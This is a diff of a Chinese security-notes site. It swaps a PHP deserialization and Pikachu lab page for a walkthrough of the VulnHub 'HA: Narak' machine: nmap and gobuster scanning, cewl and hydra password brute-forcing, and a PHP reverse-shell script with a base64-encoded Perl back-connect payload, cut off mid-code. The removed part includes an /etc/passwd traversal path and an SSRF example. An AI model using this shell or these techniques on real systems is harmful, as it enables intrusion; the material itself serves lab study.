@@ -9,17 +9,17 @@
       
       
       
-        <link rel="prev" href="../Nginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+        <link rel="prev" href="../msf%E6%8A%93%E5%8C%85/">
       
       
-        <link rel="next" href="../Php%20imap%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-19518%EF%BC%89/">
+        <link rel="next" href="../rsync%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/">
       
       <link rel="icon" href="../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.4.3, mkdocs-material-9.1.14">
     
     
       
-        <title>PHP序列化和反序列化 - 陈奕霖</title>
+        <title>Narak - 陈奕霖</title>
       
     
     
@@ -67,7 +67,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#1serializeunserialize" class="md-skip">
+        <a href="#_1" class="md-skip">
           跳转至
         </a>
       
@@ -102,7 +102,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              PHP序列化和反序列化
+              Narak
             
           </span>
         </div>
@@ -631,157 +631,11 @@
               
   
   
-    
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          PHP序列化和反序列化
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-nav__link">
         PHP序列化和反序列化
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#1serializeunserialize" class="md-nav__link">
-    1.序列化serialize()与反序列化unserialize(）
-  </a>
-  
-    <nav class="md-nav" aria-label="1.序列化serialize()与反序列化unserialize(）">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#ctf1" class="md-nav__link">
-    实验一：ctf1
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#ctf2" class="md-nav__link">
-    实验二：CTF2
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#ctf3" class="md-nav__link">
-    实验三：CTF3
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#pikachu-php" class="md-nav__link">
-    实验四：Pikachu PHP反序列化
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#2pikachu" class="md-nav__link">
-    2.Pikachu
-  </a>
-  
-    <nav class="md-nav" aria-label="2.Pikachu">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#unsafe-filedownload" class="md-nav__link">
-    一、Unsafe Filedownload(不安全的文件下载)
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    二、目录遍历
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    三、敏感信息泄露：
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#urlurl" class="md-nav__link">
-    四、URL重定向（不安全的url跳转）
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#ssrfserver-side-request-forgery" class="md-nav__link">
-    五、SSRF(Server-Side Request Forgery:服务器端请求伪造)
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#over-permission" class="md-nav__link">
-    六、Over Permission
-  </a>
-  
-    <nav class="md-nav" aria-label="六、Over Permission">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
-    水平越权：
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_4" class="md-nav__link">
-    垂直越权：
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -931,11 +785,62 @@
               
   
   
+    
   
-    <li class="md-nav__item">
-      <a href="../narak/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Narak
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         Narak
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    一、信息搜集：
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    二、漏洞利用与探测：
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    三、提权
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -1070,118 +975,23 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#1serializeunserialize" class="md-nav__link">
-    1.序列化serialize()与反序列化unserialize(）
+  <a href="#_1" class="md-nav__link">
+    一、信息搜集：
   </a>
-  
-    <nav class="md-nav" aria-label="1.序列化serialize()与反序列化unserialize(）">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#ctf1" class="md-nav__link">
-    实验一：ctf1
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#ctf2" class="md-nav__link">
-    实验二：CTF2
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#ctf3" class="md-nav__link">
-    实验三：CTF3
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#pikachu-php" class="md-nav__link">
-    实验四：Pikachu PHP反序列化
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#2pikachu" class="md-nav__link">
-    2.Pikachu
-  </a>
-  
-    <nav class="md-nav" aria-label="2.Pikachu">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#unsafe-filedownload" class="md-nav__link">
-    一、Unsafe Filedownload(不安全的文件下载)
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    二、目录遍历
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
   <a href="#_2" class="md-nav__link">
-    三、敏感信息泄露：
+    二、漏洞利用与探测：
   </a>
   
 </li>
-        
-          <li class="md-nav__item">
-  <a href="#urlurl" class="md-nav__link">
-    四、URL重定向（不安全的url跳转）
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#ssrfserver-side-request-forgery" class="md-nav__link">
-    五、SSRF(Server-Side Request Forgery:服务器端请求伪造)
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#over-permission" class="md-nav__link">
-    六、Over Permission
-  </a>
-  
-    <nav class="md-nav" aria-label="六、Over Permission">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
+      
+        <li class="md-nav__item">
   <a href="#_3" class="md-nav__link">
-    水平越权：
+    三、提权
   </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_4" class="md-nav__link">
-    垂直越权：
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
@@ -1200,116 +1010,228 @@
                   
 
 
-  <h1>PHP序列化和反序列化</h1>
+  <h1>Narak</h1>
 
-<p>今日未解决问题，ctf3获取flag</p>
-<h3 id="1serializeunserialize">1.序列化serialize()与反序列化unserialize(）</h3>
-<p>序列化：把一个对象变成可以传输的字符串。</p>
-<p>反序列化：把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。</p>
-<p>列举如下：</p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps1.jpg" /> </p>
-<h4 id="ctf1">实验一：ctf1</h4>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps2.jpg" /> </p>
-<p>查看源码，得到flag要使KEY=”hahaha”序列化：</p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps3.jpg" /> </p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps4.jpg" /> </p>
-<p>将序列化成后的语句get,可得flag.</p>
-<h4 id="ctf2">实验二：CTF2</h4>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps5.jpg" /> </p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps6.jpg" /> </p>
-<p>查看源码可得信息，要得到flag</p>
-<p>将cookie的值也就是key的值序列化</p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps7.jpg" /> </p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps8.jpg" /> </p>
-<p>保存回车之后无结果。</p>
-<p>再分析源代码，cookie的值“KEY”是null，对null进行反序列化</p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps9.jpg" /> </p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps10.jpg" /> </p>
-<p>并保存到cookie中，进行刷新，得到flag</p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps11.jpg" /> </p>
-<h4 id="ctf3">实验三：CTF3</h4>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps12.jpg" /> </p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps13.jpg" /> </p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps14.jpg" /> </p>
-<h4 id="pikachu-php">实验四：Pikachu PHP反序列化</h4>
-<p>查看源码，注释提示序列化</p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps15.jpg" /> </p>
-<p>O:1:"S":1:{s:4:"test";s:10:"helloworld";}</p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps16.jpg" /> </p>
-<h3 id="2pikachu">2.Pikachu</h3>
-<h4 id="unsafe-filedownload">一、Unsafe Filedownload(不安全的文件下载)</h4>
-<p>文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。</p>
-<p>此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。</p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps17.jpg" /> </p>
-<p>在D盘下放入一个lala.txt文件，内容为hello world！</p>
-<p>在抓取的包内更改路径可获取更目录下文件，并读取</p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps18.jpg" /> </p>
-<h4 id="_1">二、目录遍历</h4>
-<p>在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。 </p>
-<p>当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 </p>
-<p>在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。 从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。</p>
-<p>看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思</p>
-<p>是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下。 </p>
-<p>需要区分一下的是,如果你通过不带参数的url（比如：http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，我们成为敏感信息泄露。 而并不归为目录遍历漏洞。</p>
-<p>其实，目录遍历是由于容器（中间件）不安全的配置造成的。</p>
-<p>漏洞利用的方法</p>
-<p>直接使用 ../ 进入上一个目录，如果出现目录列表，即为存在漏洞</p>
-<p>127.0.0.1/pikachu/vul/dir/../</p>
-<h4 id="_2">三、敏感信息泄露：</h4>
-<p>在网页源码中，可以找到很多注释，由于开发人员疏忽，造成代码中可能存在测试账号，文件目录等重要敏感信息。从而造成信息泄露。</p>
-<p>今后除了源码信息审查以外，要注重对JS代码的审查。</p>
-<p>漏洞利用的方法：直接获取，直接使用。</p>
-<p>Ctrl+u查看源码，源码中有注释测试账号密码：</p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps19.jpg" /> </p>
-<p>直接用账号密码登录：</p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps20.jpg" /> </p>
-<h4 id="urlurl">四、URL重定向（不安全的url跳转）</h4>
-<p>利用主站对服务器的信任</p>
-<p>不安全的url跳转问题可能发生在一切执行了url地址跳转的地方。</p>
-<p>如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的url地址)参数作为了跳转的目的地,而又没有做判断的话</p>
-<p>就可能发生"跳错对象"的问题。</p>
-<p>url跳转比较直接的危害是:</p>
-<p>--&gt;钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站</p>
-<p>将url的值改为要跳转的页面地址：</p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps21.jpg" /> </p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps22.jpg" /> </p>
-<h4 id="ssrfserver-side-request-forgery">五、SSRF(Server-Side Request Forgery:服务器端请求伪造)</h4>
-<p>CURL</p>
-<p>将url的值改为要跳转的页面地址：</p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps23.jpg" /> </p>
-<p>抓包，并对访问端口暴力破解</p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps24.jpg" /> </p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps25.jpg" /> </p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps26.jpg" /> </p>
-<p>File_get_content</p>
-<p>file_get_contents() 把整个文件读入一个字符串中。该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。点开后显示下面那段文字url变化了</p>
-<p>http://192.168.56.1/pikachu/vul/ssrf/ssrf_fgc.php?file=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info2.php</p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps27.jpg" /> </p>
-<h4 id="over-permission">六、Over Permission</h4>
-<p>如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。 越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。 </p>
-<p>一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对 对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。 </p>
-<p>因此，在在权限管理中应该遵守：
-1.使用最小权限原则对用户进行赋权;
-2.使用合理（严格）的权限校验规则;
-3.使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件;</p>
-<h5 id="_3">水平越权：</h5>
-<p>水平越权访问是一种“基于数据的访问控制”设计缺陷引起的漏洞。由于服务器端在接收到请求数据进行操作时没有判断数据的所属人/所属部门而导致的越权数据访问漏洞。 </p>
-<p>登录一个账号，并抓包</p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps28.jpg" /> </p>
-<p>抓包之后改变username更换到另一个用户名的页面下：</p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps29.jpg" /> </p>
-<h5 id="_4">垂直越权：</h5>
-<p>垂直越权是一种“基于URL的访问控制”设计缺陷引起的漏洞，又叫做权限提升攻击。</p>
-<p>开启抓包，登录到管理员admin后台，并进行查看用户添加用户一系列操作：</p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps30.jpg" /> </p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps31.jpg" /> </p>
-<p>退出后登录一个非管理员用户，非管理员用户是无权限添加用户，则将抓取数据包内文件地址更改，以非管理员的身份进入到用户更改界面：</p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps32.jpg" /> </p>
-<p>pikachu/vul/overpermission/op2/op2_user.php</p>
-<p>用这个地址在pikachu用户登录页面跳转，获取</p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps33.jpg" /> </p>
-<p>退出后管理员登录，查看用户列表，可见用pikachu用户添加的用户消息：</p>
-<p><img alt="img" src="../PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/wps34.jpg" /> </p>
+<p>靶机网址：<a href="https://www.vulnhub.com/entry/ha-narak,569/">HA: Narak ~ VulnHub</a></p>
+<hr />
+<h2 id="_1"><strong>一、信息搜集：</strong></h2>
+<ol>
+<li><strong>获取IP：</strong></li>
+</ol>
+<p><strong>nmap -sP 192.168.8.0/24</strong>  </p>
+<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609325.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
+<ol>
+<li><strong>端口扫描：</strong></li>
+</ol>
+<p><strong>nmap -sV -p- -sC 192.168.8.132 -n -vv</strong></p>
+<p><strong>22、80端口均开启</strong></p>
+<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609714.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
+<ol>
+<li><strong>访问192.168.8.132</strong></li>
+</ol>
+<p><strong>从页面搜索信息</strong></p>
+<p><strong><em>*<img alt="img" src="../narak.assets/20210804212610480.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
+<p><strong><em>*<img alt="img" src="../narak.assets/20210804212608986.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
+<p><strong>·</strong></p>
+<p><strong>翻译了一下网页内容信息提取关键字或许有用： yamdoot,swarm,narak</strong></p>
+<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609185.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
+<ol>
+<li><strong>目录扫描：</strong></li>
+</ol>
+<p><strong>gobuster dir -q -u *<em>http://192.168.8.132*</em> -w /usr/share/seclists/Discovery/Web-Content/common.txt</strong></p>
+<p><strong>注意到/webdav</strong></p>
+<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609227.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
+<p><strong>访问该目录</strong></p>
+<p><strong><em>*<img alt="img" src="../narak.assets/2021080421261084.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
+<p><strong>用上边关键字随便输入尝试登录也没用</strong></p>
+<ol>
+<li><strong>尝试爆破获取密码</strong></li>
+</ol>
+<p><strong>先爬取密码文件</strong></p>
+<p><strong>cewl 192.168.8.132 -w passwd1.txt</strong> </p>
+<p><strong>再用hydra爆破以下</strong></p>
+<p><strong>账号密码：yamdoot, Swarg</strong></p>
+<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609396.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
+<p><strong>再尝试登陆下：</strong></p>
+<p><strong><em>*<img alt="img" src="../narak.assets/2021080421260972.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
+<ol>
+<li><strong>无可用信息，查看下源代码：</strong></li>
+</ol>
+<p><strong>意思是服务器无法验证我是否有权访问该文档，或者密码或者证书的问题</strong></p>
+<p><strong><em>*<img alt="img" src="../narak.assets/2021080421260953.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
+<ol>
+<li><strong>查找关于webdav的漏洞文章</strong></li>
+</ol>
+<p><strong>用Metasploits模块检查是否启用了webdav</strong></p>
+<p><strong>使用 ：auxiliary/scanner/http/webdav_scanner</strong></p>
+<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609709.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
+<p><strong>设置参数：</strong></p>
+<p><strong>将路径改为 /dav,这是webdav常用目录</strong></p>
+<p><strong>设置目标IP地址</strong></p>
+<p><strong>run启动模块</strong></p>
+<p><strong>扫描结果：</strong></p>
+<p><strong>http信息，包括apache版本，是否启用webdav</strong></p>
+<p><strong>显然结果是没开启，所以这条路行不通</strong></p>
+<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609542.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
+<ol>
+<li><strong>再搜索关于webdav（可以上传文件）:</strong></li>
+</ol>
+<p><strong>WebDAV （Web-based Distributed Authoring and Versioning） 一种基于 *<em><a href="https://baike.baidu.com/item/HTTP">HTTP</a>*<em> 1.1协议的*</em><a href="https://baike.baidu.com/item/通信协议/3351624">通信协议</a>*<em>。它*</em><a href="https://baike.baidu.com/item/扩展/2732987">扩展</a>*<em>了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法，使*</em><a href="https://baike.baidu.com/item/应用程序/5985445">应用程序</a>*<em>可对*</em><a href="https://baike.baidu.com/item/Web Server/9306055">Web Server</a>*<em>直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的*</em><a href="https://baike.baidu.com/item/版本控制/3311252">版本控制</a>*</em></strong></p>
+<p><strong>所以进一步可以实行上传一个反链接脚本</strong></p>
+<h2 id="_2"><strong>二、漏洞利用与探测：</strong></h2>
+<ol>
+<li><strong>查找到cadaver可以对webdav进行读写</strong></li>
+</ol>
+<p><strong>上传一个php的反链脚本</strong></p>
+<p><strong>代码如下（更改IP和端口）：</strong></p>
+<div class="highlight"><pre><span></span><code>&lt;?php
+
+function which($pr) {
+
+$path = execute(&quot;which $pr&quot;);
+
+return ($path ? $path : $pr);
+
+}
+
+function execute($cfe) {
+
+$res = &#39;&#39;;
+
+if ($cfe) {
+
+if(function_exists(&#39;exec&#39;)) {
+
+@exec($cfe,$res);
+
+$res = join(&quot;\n&quot;,$res);
+
+} elseif(function_exists(&#39;shell_exec&#39;)) {
+
+$res = @shell_exec($cfe);
+
+} elseif(function_exists(&#39;system&#39;)) {
+
+@ob_start();
+
+@system($cfe);
+
+$res = @ob_get_contents();
+
+@ob_end_clean();
+
+} elseif(function_exists(&#39;passthru&#39;)) {
+
+@ob_start();
+
+@passthru($cfe);
+
+$res = @ob_get_contents();
+
+@ob_end_clean();
+
+} elseif(@is_resource($f = @popen($cfe,&quot;r&quot;))) {
+
+$res = &#39;&#39;;
+
+while(!@feof($f)) {
+
+$res .= @fread($f,1024);
+
+}
+
+@pclose($f);
+
+}
+
+}
+
+return $res;
+
+}
+
+function cf($fname,$text){
+
+if($fp=@fopen($fname,&#39;w&#39;)) {
+
+@fputs($fp,@base64_decode($text));
+
+@fclose($fp);
+
+}
+
+}
+
+$yourip = &quot;your IP&quot;;
+
+$yourport = &#39;your port&#39;;
+
+$usedb = array(&#39;perl&#39;=&gt;&#39;perl&#39;,&#39;c&#39;=&gt;&#39;c&#39;);
+
+$back_connect=&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&quot;.
+
+&quot;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&quot;.
+
